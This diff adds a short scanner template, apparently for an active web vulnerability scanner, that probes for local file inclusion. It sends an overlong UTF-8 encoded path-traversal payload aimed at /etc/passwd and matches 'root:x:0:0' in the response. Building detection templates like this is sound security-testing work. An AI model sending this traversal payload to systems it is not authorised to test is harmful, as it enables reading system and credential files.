@@ -1,0 +1,22 @@
+id: patt-lfi-overlong-01-path
+name: 'PATT lfi patt-lfi-overlong-01 via path'
+severity: high
+type: active
+tags:
+  - lfi
+  - patt
+  - encodeoverlong
+requires:
+  - java
+description: 'PATT Overlong UTF-8: %c0%ae = dot. [patt:patt-lfi-overlong-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      path:
+        - '%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
